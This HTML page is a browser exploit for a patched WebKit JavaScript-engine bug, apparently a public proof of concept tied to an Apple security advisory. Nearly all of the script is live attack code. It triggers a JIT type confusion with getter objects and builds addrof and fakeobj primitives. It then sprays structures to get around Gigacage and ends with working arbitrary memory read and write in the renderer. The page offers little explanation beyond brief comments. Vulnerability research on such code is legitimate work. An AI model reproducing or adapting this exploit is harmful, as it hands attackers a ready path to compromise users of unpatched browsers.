<!DOCTYPE html>
<html>
    <head>
        <style>
            body {
                font-family: 'Courier New', Courier, monospace;
                font-size: 4rem;
            }
        </style>
    </head>
<body>
<script src="util.js"></script>
<script src="int64.js"></script>
<script>
/*
author: @po6ix
commit: https://github.com/WebKit/WebKit/commit/08d5d17c766ffc7ca6a7c833c5720eb71b427784
advisory: https://support.apple.com/en-us/HT213926
*/

let boxed_arr = new Function();
boxed_arr.p1 = 1.1;
boxed_arr[0] = {};

let getter = new Function();
getter.p1 = 1.1;
getter[0] = 1.1;

let shape = {};
for (let i = 0; i < 14; ++i) {
    shape['p'+i] = i;
}

let shapes = [];
for (let i = 0; i < 100; ++i) {
    shapes.push({
        ...shape,
        ['z'+i]: 0x1337
    });
}

function trigger(type) {
    let object_a = {};
    object_a.foo = 1;
    object_a.p1 = 1.1;

    let object_b = {};
    object_b.__defineGetter__('p1', getter);
    object_b.foo = 1;

    function get_getterSetter(type) {
        let o, retval;

        if (type == 0) o = object_a;
        else o = object_b;

        for (let i = 0; i < 2; ++i) {
            if (type == 0) retval = o.foo;
            else retval = o.foo;
        }
        return retval;
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }

    return [getter, get_getterSetter(1)];
}


(function pwn() {
    let [getter, getterSetter] = trigger();
    let success = false;
    try {
        getterSetter.toString();
    } catch(e) {
        // it should fail to call toString
        success = true;
    }
    if (!success) {
        alert('failed to get getterSetter');
        return;
    }

    let symbolObject = Object(getterSetter);

    let ref_arr = [];
    for (let i = 0; i < 87; ++i) {
        ref_arr.push(symbolObject.description);
    }

    getter.p13 = 1.1; // change the length of boxed_arr
    let unboxed_arr = getter;
    
    function addrof(o) {
        boxed_arr[8] = o;
        // return unboxed_arr[0];
        return Int64.fromDouble(unboxed_arr[0]);
    }

    function fakeobj(addr) {
        unboxed_arr[0] = addr.asDouble();
        // unboxed_arr[0] = addr;
        return boxed_arr[8];
    }
    
    function lol() {
        var unboxed_size = 100;
        var convert = new ArrayBuffer(0x10);
        var u32 = new Uint32Array(convert);
        var u8 = new Uint8Array(convert);
        var f64 = new Float64Array(convert);
        var BASE32 = 0x100000000;

        function i2f(i) {
            u32[0] = i%BASE32;
            u32[1] = i/BASE32;
            return f64[0];
        }
        
        function f2i(f) {
            f64[0] = f;
            return u32[0] + BASE32*u32[1];
        }

        function hex(x) {
            if (x < 0)
                return `-${hex(-x)}`
            return `0x${x.toString(16)}`
        }

        function xor(a, b) {
            var res = 0, base = 1
            for (var i = 0; i < 64; ++i) {
                res += base * ((a&1) ^ (b&1))
                a = (a-(a&1))/2
                b = (b-(b&1))/2
                base *= 2
            }
            return res
        }

        function fail(x) {
            log('FAIL ' + x)
            throw null
        }
        log("stage 2");
        var structure_spray = []
        for (var i = 0; i < 1000; ++i) {
            var ary = [13.37];
            ary.prop = 13.37;
            ary['p'+i] = 13.37;
            structure_spray.push(ary);
        }

        var victim = structure_spray[510]
        // Gigacage bypass: Forge a JSObject which has its butterfly pointing
        // to victim
        u32[0] = 0x200;
        u32[1] = 0x01082007 - 0x10000;
        var flags_double = f64[0];

        u32[1] = 0x01082009 - 0x10000;
        var flags_contiguous = f64[0];

        var array_spray = [];
        for (var i = 0; i < 1000; ++i) {
            array_spray[i] = [13.37+i, 13.37];
        }
        var unboxed = eval(`[${'13.37,'.repeat(unboxed_size)}]`);
        unboxed[0] = 4.2; // no CopyOnWrite

        var boxed = [{}];
        log(`unboxed @ ${addrof(unboxed)}`);
        log(`boxed @ ${addrof(boxed)}`);

        var outer = {
            header: flags_contiguous, // cell
            butterfly: victim, // butterfly
        };
        log(`outer @ ${addrof(outer)}`);

        var hax = fakeobj(Add(addrof(outer), 16));

        hax[1] = unboxed;
        log(victim[1]);
        var shared_butterfly = f2i(victim[1]);
        log(`shared butterfly @ ${(shared_butterfly)}`);
        hax[1] = boxed;
        victim[1] = i2f(shared_butterfly);

        outer.header = flags_double;

        var stage2 = {
            addrof: function(victim) {
                boxed[0] = victim;
                return f2i(unboxed[0]);
            },

            fakeobj: function(addr) {
                unboxed[0] = i2f(addr);
                return boxed[0];
            },

            write64: function(where, what) {
                log(`writing ${(what)} at ${(where)}`);
                hax[1] = i2f(where + 0x10);
                victim.prop = this.fakeobj(what);
            },

            read64: function(where) {
                hax[1] = i2f(where + 0x10);
                return this.addrof(victim.prop);
            },

            test: function() {
                var addr = this.addrof({a: 0x1337});
                var x = this.fakeobj(addr);
                if (x.a != 0x1337) {
                    fail('stage2 addrof/fakeobj does not work');
                }

                var val = 0x42424242;
                this.write64(shared_butterfly + 8, 0x42424242);
                if (i2f(val) != unboxed[1]) {
                    fail('stage2 write does not work');
                }

                if (this.read64(shared_butterfly + 8) != 0x42424242) {
                    fail('stage2 read does not work');
                }
            },

            clear: function() {
                outer = null;
                hax = null;
                for (var i = 0; i < unboxed_size; ++i)
                    boxed[i] = null;
                boxed = null
                unboxed = null
            },
        };

        stage2.test();
        log("done");
    }

        log(`success!!!`);

        // testobject = {};
        // testobject.a = 1;
        // testobject.b = 2;
        // testobject.c = 3;
        // log("testobject addr: " + addrof(testobject).toString() + "<br>testobject properties: ");
        // Object.values(testobject).forEach((prop)=> log(prop));
        // testobjectfake = fakeobj(addrof(testobject));
        // testobjectfake.b = "we out here";
        // testobjectfake.c = 1337;
        // log("<br>fake object addr: " + addrof(testobjectfake).toString() + "<br>fakeobject edited testobject properties:");
        // Object.values(testobject).forEach((prop)=> log(prop));
        lol();
})();
</script>

</body>
</html>